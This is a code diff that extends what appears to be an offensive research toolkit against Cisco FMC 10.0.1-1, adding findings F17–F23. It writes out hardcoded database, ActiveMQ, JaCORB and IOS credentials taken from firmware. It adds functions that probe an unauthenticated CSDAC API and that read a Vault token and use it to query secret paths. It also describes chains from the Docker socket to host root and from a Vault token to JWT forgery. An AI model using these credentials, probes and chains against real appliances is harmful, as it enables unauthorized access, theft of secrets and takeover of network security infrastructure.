@@ -167,6 +167,56 @@ FMC-F16: ASDM Login Handler Hardcodes admin — SSO Token = Admin Session [HIGH]
   Token validated via MD5 (F9 cross-reference: create_sso_token = MD5(base64url(new_kek))).
   Any forged SSO token (via F9 entropy attack) logs in as admin — no admin password needed.
   POST /asdmToken.cgi?sensor_sso=<forged_token> -> admin FMC session.
+
+-- Findings from Makeself upgrade package extraction (10.0.1-1) --
+
+FMC-F17: SymmetricDS Hardcoded Database Credentials [CRITICAL]
+  syb-000.properties: dba:dmkebdpq (Sybase port 10033)
+  mdb-001.properties: root:IlahU)[hO8Ug}jdX:)5zoZx[297l*{Qv@4]wVk]/ (MySQL port 3306)
+  Commented-out alternates present (prior rotation): hxjnynvf (Sybase), L2)_Ki*IDQbT2DMHw&tu[e<kba-kj}uGBb.myX_1 (MySQL)
+  SymmetricDS replication engine syncs cfgdb (policy/config DB) between active/standby FMC.
+  Direct DB access bypasses all FMC RBAC — read/write all policies, user accounts, device config.
+
+FMC-F18: CSDAC Firmware-Embedded RSA-2048 Private Key [CRITICAL]
+  File: sf/csdac/config/certs/key.pem (RSA-2048 PKCS#8 private key)
+  Mounted into muster-envoy container as /etc/envoy/certificate.key (TLS termination key).
+  Key is identical across all FMC 10.0.1-1 installations — firmware-embedded, not generated per-install.
+  Any FMC 10.0.1-1 firmware extract yields the key; impersonation of any FMC's CSDAC/Muster endpoint.
+  muster-envoy binds HTTPS at 127.0.0.1:6443; if accessible (post-foothold), key enables TLS MITM.
+
+FMC-F19: ActiveMQ Hardcoded Credentials + JKS Password [HIGH]
+  credentials.properties: activemq.username=system, activemq.password=manager, guest.password=password
+  wrapper.conf: keyStorePassword=password, trustStorePassword=password (JKS broker TLS keys)
+  ActiveMQ version: embedded in CSCOpx (opt/CSCOpx/objects/ess/); OpenWire port 61616, AMQP 5672 (commented)
+  Full broker access with system:manager — read/publish all event queues, intercept policy distribution.
+
+FMC-F20: MUSTER_DISABLE_AUTH=True + Docker Socket in CSDAC Backend [CRITICAL]
+  docker-compose.yml muster-ui-backend: MUSTER_DISABLE_AUTH=True (explicit env var)
+  muster-ui-backend also mounts: /var/run/docker.sock:/var/run/docker.sock
+  Attack chain: network access to 127.0.0.1:6443 (muster-envoy HTTPS) ->
+    unauthenticated API calls to muster-ui-backend gRPC (DISABLE_AUTH=True) ->
+    Docker socket access from within the container -> host root.
+  CSDAC handles user identity data (AD/Azure AD enrichment) — exfiltrate all identity analytics.
+
+FMC-F21: JaCORB CORBA Hardcoded keystore and default passwords [HIGH]
+  opt/CSCOpx/lib/classpath/orb.properties:
+    jacorb.security.keystore_password=jacorb
+    jacorb.security.default_password=jacorb
+  CSCOpx CORBA IOR-based RPC uses these to authenticate SSL client connections.
+  Any client that knows "jacorb" can establish a CORBA SSL session to CSCOpx services.
+
+FMC-F22: Vault Token at Predictable Static Path [HIGH]
+  Constant: VAULT_TOKEN = '/etc/vault/token' (backup_restore_vault_secrets.pl)
+  Token used to authenticate to Vault at https://127.0.0.1:8200 via: vault login $token
+  Any process with local filesystem read access reads the token -> full Vault secret access.
+  Vault secrets backed up to /etc/sf/vault/backup/ as JSON — backup directory = offline exfil path.
+  Chain: F7 RADKit -> FTD root -> FMC pivot -> read /etc/vault/token -> Vault login -> MACHINE_USER_KEY -> F10 JWT forge.
+
+FMC-F23: IOS Backend Hardcoded admin:cisco Template Credentials [HIGH]
+  File: opt/CSCOpx/MDC/ios-backend/templates/settings/ezsdd.xml
+  Payload: username=admin&passwd=cisco (URL-encoded form params in XML template)
+  IOS backend manages Cisco IOS device communication from FMC (CDO integration).
+  Template credentials used for initial device onboarding; not rotated if template is reused.
 """
 
 import base64
@@ -177,7 +227,7 @@ import json
 import re
 from typing import Optional
 
-VERSION = "1.2.0"
+VERSION = "1.3.0"
 TARGET = "Cisco FMC 10.0.1-1"
 
 
@@ -594,6 +644,203 @@ def report_binary_pie_status(binary_path: str) -> dict:
         return {"error": str(e)}
 
 
+# ── F17: SymmetricDS credential verification ──────────────────────────────────
+
+SYMMETRICDS_CREDS = {
+    "sybase": {
+        "driver": "com.sybase.jdbc4.jdbc.SybDriver",
+        "host": "localhost",
+        "port": 10033,
+        "db": "vms",
+        "user": "dba",
+        "password": "dmkebdpq",
+        "prior_password": "hxjnynvf",
+        "file": "syb-000.properties",
+    },
+    "mysql": {
+        "driver": "com.mysql.jdbc.Driver",
+        "host": "localhost",
+        "port": 3306,
+        "db": "cfgdb",
+        "user": "root",
+        "password": "IlahU)[hO8Ug}jdX:)5zoZx[297l*{Qv@4]wVk]/",
+        "prior_password": "L2)_Ki*IDQbT2DMHw&tu[e<kba-kj}uGBb.myX_1",
+        "file": "mdb-001.properties",
+    },
+}
+
+def get_symmetricds_creds() -> dict:
+    """Return SymmetricDS hardcoded credentials for Sybase and MySQL (F17)."""
+    return SYMMETRICDS_CREDS
+
+
+# ── F18: CSDAC static key fingerprint ─────────────────────────────────────────
+
+CSDAC_KEY_PATH = "sf/csdac/config/certs/key.pem"
+CSDAC_ENVOY_PORT = 6443  # 127.0.0.1:6443 (muster-envoy HTTPS)
+CSDAC_BEE_PORT = 15050   # 127.0.0.1:15050 (muster-bee gRPC)
+
+def report_csdac_key_info() -> dict:
+    """Report CSDAC static firmware-embedded key metadata (F18)."""
+    return {
+        "finding": "FMC-F18",
+        "path": CSDAC_KEY_PATH,
+        "type": "RSA-2048 PKCS#8 private key",
+        "scope": "All FMC 10.0.1-1 installs (firmware-embedded, not per-instance generated)",
+        "usage": "muster-envoy TLS termination at 127.0.0.1:6443",
+        "impact": "TLS impersonation of any FMC CSDAC/Muster endpoint once key is extracted from firmware",
+    }
+
+
+# ── F19: ActiveMQ credential constants ────────────────────────────────────────
+
+ACTIVEMQ_CREDS = {
+    "system": "manager",
+    "guest": "password",
+}
+ACTIVEMQ_JKS_PASSWORD = "password"
+ACTIVEMQ_OPENIRE_PORT = 61616
+
+def get_activemq_creds() -> dict:
+    """Return ActiveMQ hardcoded credentials (F19)."""
+    return {
+        "finding": "FMC-F19",
+        "creds": ACTIVEMQ_CREDS,
+        "jks_password": ACTIVEMQ_JKS_PASSWORD,
+        "port": ACTIVEMQ_OPENIRE_PORT,
+        "files": [
+            "opt/CSCOpx/objects/ess/conf/credentials.properties",
+            "opt/CSCOpx/objects/ess/bin/linux-x86-64/wrapper.conf",
+        ],
+    }
+
+
+# ── F20: MUSTER_DISABLE_AUTH probe ────────────────────────────────────────────
+
+def probe_muster_unauth(host: str, port: int = 6443,
+                        session: Optional[requests.Session] = None) -> dict:
+    """
+    Probe muster-envoy HTTPS endpoint for unauthenticated access (F20).
+    MUSTER_DISABLE_AUTH=True removes all auth from muster-ui-backend.
+    muster-envoy listens at 127.0.0.1:6443 and proxies to the backend.
+    Common paths: /, /api/v1/, /api/v1/connectors, /api/v1/identities
+    """
+    if session is None:
+        session = requests.Session()
+    session.verify = False
+
+    results = {}
+    base = f"https://{host}:{port}"
+    paths = ["/", "/api/v1/", "/api/v1/connectors", "/api/v1/identities",
+             "/api/v1/users", "/api/v1/groups", "/health"]
+
+    for path in paths:
+        url = f"{base}{path}"
+        try:
+            r = session.get(url, timeout=8)
+            results[path] = {
+                "status": r.status_code,
+                "content_type": r.headers.get("content-type", ""),
+                "body_snippet": r.text[:300],
+            }
+        except Exception as e:
+            results[path] = {"error": str(e)}
+
+    return {"finding": "FMC-F20", "host": host, "port": port, "results": results}
+
+
+# ── F21: JaCORB constant ───────────────────────────────────────────────────────
+
+JACORB_KEYSTORE_PASSWORD = "jacorb"
+JACORB_DEFAULT_PASSWORD = "jacorb"
+
+def get_jacorb_creds() -> dict:
+    """Return JaCORB hardcoded passwords (F21)."""
+    return {
+        "finding": "FMC-F21",
+        "keystore_password": JACORB_KEYSTORE_PASSWORD,
+        "default_password": JACORB_DEFAULT_PASSWORD,
+        "file": "opt/CSCOpx/lib/classpath/orb.properties",
+        "impact": "Any CORBA SSL client that uses 'jacorb' as credential authenticates to CSCOpx services",
+    }
+
+
+# ── F22: Vault token extraction ────────────────────────────────────────────────
+
+VAULT_TOKEN_PATH = "/etc/vault/token"
+VAULT_BACKUP_DIR = "/etc/sf/vault/backup/"
+VAULT_API_URL = "https://127.0.0.1:8200"
+
+def probe_vault_token_access(rootfs_path: Optional[str] = None) -> dict:
+    """
+    Check for Vault token at static path (F22).
+    In a live system, /etc/vault/token is the root token for Vault API access.
+    From firmware extraction, token is not present but path is confirmed static.
+    """
+    result = {
+        "finding": "FMC-F22",
+        "token_path": VAULT_TOKEN_PATH,
+        "backup_dir": VAULT_BACKUP_DIR,
+        "vault_api": VAULT_API_URL,
+        "token_found": False,
+        "token_value": None,
+    }
+
+    if rootfs_path:
+        token_file = Path(rootfs_path) / VAULT_TOKEN_PATH.lstrip("/")
+        if token_file.exists():
+            result["token_found"] = True
+            result["token_value"] = token_file.read_text().strip()
+
+        backup = Path(rootfs_path) / VAULT_BACKUP_DIR.lstrip("/")
+        if backup.is_dir():
+            result["backup_files"] = [f.name for f in backup.iterdir() if f.suffix == ".json"]
+
+    return result
+
+
+def probe_vault_api(host: str = "127.0.0.1", port: int = 8200,
+                    token: Optional[str] = None,
+                    session: Optional[requests.Session] = None) -> dict:
+    """
+    Probe Vault API with an extracted token (F22 + Chain D extension).
+    GET /v1/secret/ lists all secret paths if token is valid.
+    """
+    if session is None:
+        session = requests.Session()
+    session.verify = False
+
+    base = f"https://{host}:{port}"
+    headers = {"X-Vault-Token": token} if token else {}
+
+    results = {}
+    paths = ["/v1/sys/health", "/v1/secret/", "/v1/secret/data/", "/v1/auth/token/lookup-self"]
+    for path in paths:
+        url = f"{base}{path}"
+        try:
+            r = session.get(url, headers=headers, timeout=8)
+            results[path] = {"status": r.status_code, "body": r.text[:400]}
+        except Exception as e:
+            results[path] = {"error": str(e)}
+
+    return {"finding": "FMC-F22", "host": host, "results": results}
+
+
+# ── F23: IOS backend credentials ──────────────────────────────────────────────
+
+IOS_BACKEND_CREDS = {"username": "admin", "password": "cisco"}
+IOS_BACKEND_TEMPLATE = "opt/CSCOpx/MDC/ios-backend/templates/settings/ezsdd.xml"
+
+def get_ios_backend_creds() -> dict:
+    """Return IOS backend hardcoded device template credentials (F23)."""
+    return {
+        "finding": "FMC-F23",
+        "creds": IOS_BACKEND_CREDS,
+        "template_file": IOS_BACKEND_TEMPLATE,
+        "impact": "admin:cisco used for IOS device onboarding; reused if template not regenerated post-install",
+    }
+
+
 def full_findings_summary() -> list[dict]:
     """Return all confirmed FMC findings as structured records."""
     return [
@@ -753,6 +1000,108 @@ def full_findings_summary() -> list[dict]:
             "version": "10.0.1-1",
             "file": "sf/lib/perl/5.34.3/SF/Mojo/Handlers/AsdmLoginHandler.pm",
             "details": "Login({ username=>'admin', password=>$token }); MD5 token (F9) -> admin FMC session",
+        },
+        {
+            "id": "FMC-F17",
+            "severity": "CRITICAL",
+            "component": "SymmetricDS / database replication",
+            "title": "SymmetricDS hardcoded Sybase and MySQL credentials",
+            "cve": None,
+            "version": "10.0.1-1",
+            "files": ["syb-000.properties", "mdb-001.properties"],
+            "details": (
+                "Sybase: dba:dmkebdpq (port 10033); "
+                "MySQL: root:IlahU)[hO8Ug}jdX:)5zoZx[297l*{Qv@4]wVk]/ (port 3306); "
+                "prior passwords commented out in both files"
+            ),
+        },
+        {
+            "id": "FMC-F18",
+            "severity": "CRITICAL",
+            "component": "CSDAC / muster-envoy TLS",
+            "title": "Firmware-embedded RSA-2048 private key shared across all FMC 10.0.1-1 installs",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "sf/csdac/config/certs/key.pem",
+            "details": (
+                "RSA-2048 PKCS#8 key mounted into muster-envoy as /etc/envoy/certificate.key; "
+                "identical across all FMC 10.0.1-1 installs; "
+                "enables TLS impersonation of any FMC's CSDAC endpoint"
+            ),
+        },
+        {
+            "id": "FMC-F19",
+            "severity": "HIGH",
+            "component": "CSCOpx / ActiveMQ",
+            "title": "ActiveMQ hardcoded credentials and default JKS keystore password",
+            "cve": None,
+            "version": "10.0.1-1",
+            "files": [
+                "opt/CSCOpx/objects/ess/conf/credentials.properties",
+                "opt/CSCOpx/objects/ess/bin/linux-x86-64/wrapper.conf",
+            ],
+            "details": (
+                "system:manager, guest:password in credentials.properties; "
+                "keyStorePassword=password, trustStorePassword=password in wrapper.conf; "
+                "OpenWire port 61616"
+            ),
+        },
+        {
+            "id": "FMC-F20",
+            "severity": "CRITICAL",
+            "component": "CSDAC / muster-ui-backend",
+            "title": "MUSTER_DISABLE_AUTH=True with Docker socket mount in CSDAC backend",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "sf/csdac/docker-compose.yml",
+            "details": (
+                "muster-ui-backend: MUSTER_DISABLE_AUTH=True env var disables all auth; "
+                "/var/run/docker.sock mounted read-write; "
+                "chain: unauthenticated API (127.0.0.1:6443) -> Docker socket -> host root"
+            ),
+        },
+        {
+            "id": "FMC-F21",
+            "severity": "HIGH",
+            "component": "CSCOpx / JaCORB CORBA",
+            "title": "JaCORB hardcoded keystore and default passwords",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "opt/CSCOpx/lib/classpath/orb.properties",
+            "details": (
+                "jacorb.security.keystore_password=jacorb; "
+                "jacorb.security.default_password=jacorb; "
+                "any client knowing 'jacorb' establishes authenticated CORBA SSL sessions"
+            ),
+        },
+        {
+            "id": "FMC-F22",
+            "severity": "HIGH",
+            "component": "HashiCorp Vault / backup",
+            "title": "Vault token at static filesystem path — any local read = Vault compromise",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "sf/bin/backup_restore_vault_secrets.pl",
+            "details": (
+                "VAULT_TOKEN='/etc/vault/token'; "
+                "vault login $token grants full Vault access; "
+                "secrets backed up to /etc/sf/vault/backup/*.json; "
+                "chain: F7 RADKit -> FTD root -> FMC pivot -> Vault token -> F10 MACHINE_USER_KEY -> JWT forge"
+            ),
+        },
+        {
+            "id": "FMC-F23",
+            "severity": "HIGH",
+            "component": "CSCOpx IOS backend",
+            "title": "IOS backend hardcoded admin:cisco in device template",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "opt/CSCOpx/MDC/ios-backend/templates/settings/ezsdd.xml",
+            "details": (
+                "username=admin&passwd=cisco in XML device template; "
+                "used for IOS device onboarding from FMC; "
+                "credentials reused if template not regenerated"
+            ),
         },
     ]
 
